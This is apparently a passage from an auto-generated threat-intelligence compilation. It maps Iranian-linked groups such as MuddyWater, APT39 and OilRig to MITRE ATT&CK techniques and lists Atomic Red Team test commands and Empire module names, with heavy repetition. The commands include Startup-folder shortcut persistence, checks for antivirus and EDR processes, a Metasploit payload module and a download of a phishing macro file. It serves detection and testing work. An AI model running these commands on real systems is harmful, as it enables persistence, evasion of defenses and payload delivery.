On Linux, there is the native command <code>xwd</code>. (Citation: Antiquated Mac Malware)
```

## Technique Commands

```
screencapture
screencapture -x
xwd -root -out desktop.xwd
xwud -in desktop.xwd
import -window root
powershell/collection/screenshot
powershell/collection/screenshot
python/collection/osx/native_screenshot
python/collection/osx/native_screenshot
python/collection/osx/native_screenshot_mss
python/collection/osx/native_screenshot_mss
python/collection/osx/screenshot
python/collection/osx/screenshot
```



# Actor: Group5

## Actor Description

```
[Group5](https://attack.mitre.org/groups/G0043) is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. [Group5](https://attack.mitre.org/groups/G0043) has used two commonly available remote access tools (RATs), [njRAT](https://attack.mitre.org/software/S0385) and [NanoCore](https://attack.mitre.org/software/S0336), as well as an Android RAT, DroidJack. (Citation: Citizen Lab Group5)
```

## Actor Aliases

```
Group5
```

## Technique Name: Screen Capture

## Technique Description

```
Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.

### Mac

On OSX, the native command <code>screencapture</code> is used to capture screenshots.

### Linux

On Linux, there is the native command <code>xwd</code>. (Citation: Antiquated Mac Malware)
```

## Technique Commands

```
screencapture
screencapture -x
xwd -root -out desktop.xwd
xwud -in desktop.xwd
import -window root
powershell/collection/screenshot
powershell/collection/screenshot
python/collection/osx/native_screenshot
python/collection/osx/native_screenshot
python/collection/osx/native_screenshot_mss
python/collection/osx/native_screenshot_mss
python/collection/osx/screenshot
python/collection/osx/screenshot
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Screen Capture

## Technique Description

```
Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.

### Mac

On OSX, the native command <code>screencapture</code> is used to capture screenshots.

### Linux

On Linux, there is the native command <code>xwd</code>. (Citation: Antiquated Mac Malware)
```

## Technique Commands

```
screencapture
screencapture -x
xwd -root -out desktop.xwd
xwud -in desktop.xwd
import -window root
powershell/collection/screenshot
powershell/collection/screenshot
python/collection/osx/native_screenshot
python/collection/osx/native_screenshot
python/collection/osx/native_screenshot_mss
python/collection/osx/native_screenshot_mss
python/collection/osx/screenshot
python/collection/osx/screenshot
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Screen Capture

## Technique Description

```
Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations.

### Mac

On OSX, the native command <code>screencapture</code> is used to capture screenshots.

### Linux

On Linux, there is the native command <code>xwd</code>. (Citation: Antiquated Mac Malware)
```

## Technique Commands

```
screencapture
screencapture -x
xwd -root -out desktop.xwd
xwud -in desktop.xwd
import -window root
powershell/collection/screenshot
powershell/collection/screenshot
python/collection/osx/native_screenshot
python/collection/osx/native_screenshot
python/collection/osx/native_screenshot_mss
python/collection/osx/native_screenshot_mss
python/collection/osx/screenshot
python/collection/osx/screenshot
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Scripting

## Technique Description

```
Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.

Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.

Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)
```

## Technique Commands

```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
chmod +x /tmp/art.sh
sh /tmp/art.sh
C:\Windows\system32\cmd.exe /Q /c echo #{command_to_execute} > C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c echo dir > C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat
cscript.exe
*.jse
cscript.exe
*.vbe
cscript.exe
*.js
cscript.exe
*.vba
cscript.exe
*.vbs
excel.exe
cmd.exe
excel.exe
cscript.exe
excel.exe
wscript.exe
excel.exe
sh.exe
excel.exe
bash.exe
mshta.exe
cscript.exe
mshta.exe
wscript.exe
powerpoint.exe
cmd.exe
powerpoint.exe
cscript.exe
powerpoint.exe
wscript.exe
powerpoint.exe
sh.exe
powerpoint.exe
bash.exe
winword.exe
cmd.exe
powershell.exe
winword.exe
cmd.exe
winword.exe
cscript.exe
winword.exe
wscript.exe
winword.exe
sh.exe
winword.exe
bash.exe
winword.exe
csc.exe
cvtres.exe
wscript.exe
wscript.exe
*.jse
wscript.exe
*.vbe
wscript.exe
*.js
wscript.exe
*.vba
wscript.exe
*.vbs
winword.exe
javaw.exe
java.exe
wscript.exe|cscript.exe
powershell/code_execution/invoke_metasploitpayload
powershell/code_execution/invoke_metasploitpayload
powershell/management/invoke_script
powershell/management/invoke_script
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Scripting

## Technique Description

```
Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.

Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.

Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)
```

## Technique Commands

```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
chmod +x /tmp/art.sh
sh /tmp/art.sh
C:\Windows\system32\cmd.exe /Q /c echo #{command_to_execute} > C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c echo dir > C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat
cscript.exe
*.jse
cscript.exe
*.vbe
cscript.exe
*.js
cscript.exe
*.vba
cscript.exe
*.vbs
excel.exe
cmd.exe
excel.exe
cscript.exe
excel.exe
wscript.exe
excel.exe
sh.exe
excel.exe
bash.exe
mshta.exe
cscript.exe
mshta.exe
wscript.exe
powerpoint.exe
cmd.exe
powerpoint.exe
cscript.exe
powerpoint.exe
wscript.exe
powerpoint.exe
sh.exe
powerpoint.exe
bash.exe
winword.exe
cmd.exe
powershell.exe
winword.exe
cmd.exe
winword.exe
cscript.exe
winword.exe
wscript.exe
winword.exe
sh.exe
winword.exe
bash.exe
winword.exe
csc.exe
cvtres.exe
wscript.exe
wscript.exe
*.jse
wscript.exe
*.vbe
wscript.exe
*.js
wscript.exe
*.vba
wscript.exe
*.vbs
winword.exe
javaw.exe
java.exe
wscript.exe|cscript.exe
powershell/code_execution/invoke_metasploitpayload
powershell/code_execution/invoke_metasploitpayload
powershell/management/invoke_script
powershell/management/invoke_script
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Scripting

## Technique Description

```
Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.

Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.

Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)
```

## Technique Commands

```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
chmod +x /tmp/art.sh
sh /tmp/art.sh
C:\Windows\system32\cmd.exe /Q /c echo #{command_to_execute} > C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c echo dir > C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat
cscript.exe
*.jse
cscript.exe
*.vbe
cscript.exe
*.js
cscript.exe
*.vba
cscript.exe
*.vbs
excel.exe
cmd.exe
excel.exe
cscript.exe
excel.exe
wscript.exe
excel.exe
sh.exe
excel.exe
bash.exe
mshta.exe
cscript.exe
mshta.exe
wscript.exe
powerpoint.exe
cmd.exe
powerpoint.exe
cscript.exe
powerpoint.exe
wscript.exe
powerpoint.exe
sh.exe
powerpoint.exe
bash.exe
winword.exe
cmd.exe
powershell.exe
winword.exe
cmd.exe
winword.exe
cscript.exe
winword.exe
wscript.exe
winword.exe
sh.exe
winword.exe
bash.exe
winword.exe
csc.exe
cvtres.exe
wscript.exe
wscript.exe
*.jse
wscript.exe
*.vbe
wscript.exe
*.js
wscript.exe
*.vba
wscript.exe
*.vbs
winword.exe
javaw.exe
java.exe
wscript.exe|cscript.exe
powershell/code_execution/invoke_metasploitpayload
powershell/code_execution/invoke_metasploitpayload
powershell/management/invoke_script
powershell/management/invoke_script
```



# Actor: Leafminer

## Actor Description

```
[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)
```

## Actor Aliases

```
Leafminer
Raspite
```

## Technique Name: Scripting

## Technique Description

```
Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.

Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.

Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)
```

## Technique Commands

```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
chmod +x /tmp/art.sh
sh /tmp/art.sh
C:\Windows\system32\cmd.exe /Q /c echo #{command_to_execute} > C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c echo dir > C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat
cscript.exe
*.jse
cscript.exe
*.vbe
cscript.exe
*.js
cscript.exe
*.vba
cscript.exe
*.vbs
excel.exe
cmd.exe
excel.exe
cscript.exe
excel.exe
wscript.exe
excel.exe
sh.exe
excel.exe
bash.exe
mshta.exe
cscript.exe
mshta.exe
wscript.exe
powerpoint.exe
cmd.exe
powerpoint.exe
cscript.exe
powerpoint.exe
wscript.exe
powerpoint.exe
sh.exe
powerpoint.exe
bash.exe
winword.exe
cmd.exe
powershell.exe
winword.exe
cmd.exe
winword.exe
cscript.exe
winword.exe
wscript.exe
winword.exe
sh.exe
winword.exe
bash.exe
winword.exe
csc.exe
cvtres.exe
wscript.exe
wscript.exe
*.jse
wscript.exe
*.vbe
wscript.exe
*.js
wscript.exe
*.vba
wscript.exe
*.vbs
winword.exe
javaw.exe
java.exe
wscript.exe|cscript.exe
powershell/code_execution/invoke_metasploitpayload
powershell/code_execution/invoke_metasploitpayload
powershell/management/invoke_script
powershell/management/invoke_script
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Scripting

## Technique Description

```
Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.

Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.

Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)
```

## Technique Commands

```
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
chmod +x /tmp/art.sh
sh /tmp/art.sh
C:\Windows\system32\cmd.exe /Q /c echo #{command_to_execute} > C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c echo dir > C:\Windows\TEMP\execute.bat
C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat
cscript.exe
*.jse
cscript.exe
*.vbe
cscript.exe
*.js
cscript.exe
*.vba
cscript.exe
*.vbs
excel.exe
cmd.exe
excel.exe
cscript.exe
excel.exe
wscript.exe
excel.exe
sh.exe
excel.exe
bash.exe
mshta.exe
cscript.exe
mshta.exe
wscript.exe
powerpoint.exe
cmd.exe
powerpoint.exe
cscript.exe
powerpoint.exe
wscript.exe
powerpoint.exe
sh.exe
powerpoint.exe
bash.exe
winword.exe
cmd.exe
powershell.exe
winword.exe
cmd.exe
winword.exe
cscript.exe
winword.exe
wscript.exe
winword.exe
sh.exe
winword.exe
bash.exe
winword.exe
csc.exe
cvtres.exe
wscript.exe
wscript.exe
*.jse
wscript.exe
*.vbe
wscript.exe
*.js
wscript.exe
*.vba
wscript.exe
*.vbs
winword.exe
javaw.exe
java.exe
wscript.exe|cscript.exe
powershell/code_execution/invoke_metasploitpayload
powershell/code_execution/invoke_metasploitpayload
powershell/management/invoke_script
powershell/management/invoke_script
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Security Software Discovery

## Technique Description

```
Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1063) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.


### Windows

Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.

### Mac

It's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.
```

## Technique Commands

```
netsh.exe advfirewall firewall show all profiles
tasklist.exe
tasklist.exe | findstr /i virus
tasklist.exe | findstr /i cb
tasklist.exe | findstr /i defender
tasklist.exe | findstr /i cylance
get-process | ?{$_.Description -like "*virus*"}
get-process | ?{$_.Description -like "*carbonblack*"}
get-process | ?{$_.Description -like "*defender*"}
get-process | ?{$_.Description -like "*cylance*"}
ps -ef | grep Little\ Snitch | grep -v grep
ps aux | grep CbOsxSensorService
fltmc.exe | findstr.exe 385201
powershell/situational_awareness/host/antivirusproduct
powershell/situational_awareness/host/antivirusproduct
Dos
Microsoft Windows [Version 10.0.14393]
(C) 2016 Microsoft Corporation. all rights reserved.

C: \ Users \ Administrator> netsh advfirewall firewall show rule name = all

Rule Name: Network Discovery (UPnP-In)
-------------------------------------------------- --------------------
Enabled: Yes
Direction: Inbound
Profile: Dedicated
Grouping: Network Discovery
Local IP: Any
Remote IP: Any
Protocol: TCP
Local Port: 2869
Remote Port: Any
Edge traversal: No
Action: Allow
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Shortcut Modification

## Technique Description

```
Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.
```

## Technique Commands

```
echo [InternetShortcut] > test.url && echo URL=C:\windows\system32\calc.exe >> shortcutname.url && shortcutname.url
$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk")
$ShortCut.TargetPath="cmd.exe"
$ShortCut.WorkingDirectory = "C:\Windows\System32";
$ShortCut.WindowStyle = 1;
$ShortCut.Description = "T1023.";
$ShortCut.Save()

$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1023.lnk")
$ShortCut.TargetPath="cmd.exe"
$ShortCut.WorkingDirectory = "C:\Windows\System32";
$ShortCut.WindowStyle = 1;
$ShortCut.Description = "T1023.";
$ShortCut.Save()
powershell/persistence/userland/backdoor_lnk
powershell/persistence/userland/backdoor_lnk
```



# Actor: Group5

## Actor Description

```
[Group5](https://attack.mitre.org/groups/G0043) is a threat group with a suspected Iranian nexus, though this attribution is not definite. The group has targeted individuals connected to the Syrian opposition via spearphishing and watering holes, normally using Syrian and Iranian themes. [Group5](https://attack.mitre.org/groups/G0043) has used two commonly available remote access tools (RATs), [njRAT](https://attack.mitre.org/software/S0385) and [NanoCore](https://attack.mitre.org/software/S0336), as well as an Android RAT, DroidJack. (Citation: Citizen Lab Group5)
```

## Actor Aliases

```
Group5
```

## Technique Name: Software Packing

## Technique Description

```
Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.

Adversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)
```

## Technique Commands

```
```



# Actor: APT39

## Actor Description

```
[APT39](https://attack.mitre.org/groups/G0087) is an Iranian cyber espionage group that has been active since at least 2014. They have targeted the telecommunication and travel industries to collect personal information that aligns with Iran's national priorities. (Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)
```

## Actor Aliases

```
APT39
Chafer
```

## Technique Name: Software Packing

## Technique Description

```
Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.

Adversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)
```

## Technique Commands

```
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Spearphishing Attachment

## Technique Description

```
Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.
```

## Technique Commands

```
if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
  return 'Please install Microsoft Excel before running this test.'
}
else{
  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'
  $fileName = 'PhishingAttachment.xlsm'
  New-Item -Type File -Force -Path $fileName | out-null
  $wc = New-Object System.Net.WebClient
  $wc.Encoding = [System.Text.Encoding]::UTF8
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  ($wc.DownloadString("$url")) | Out-File $fileName
}
Start-Process $PathToAtomicsFolder\T1193\bin\PowerShell_IP_Doc.doc
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Spearphishing Attachment

## Technique Description

```
Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.
```

## Technique Commands

```
if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
  return 'Please install Microsoft Excel before running this test.'
}
else{
  $url = 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm'
  $fileName = 'PhishingAttachment.xlsm'
  New-Item -Type File -Force -Path $fileName | out-null
  $wc = New-Object System.Net.WebClient
  $wc.Encoding = [System.Text.Encoding]::UTF8
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  ($wc.DownloadString("$url")) | Out-File $fileName
}
Start-Process $PathToAtomicsFolder\T1193\bin\PowerShell_IP_Doc.doc
```



# Actor: OilRig

## Actor Description

```
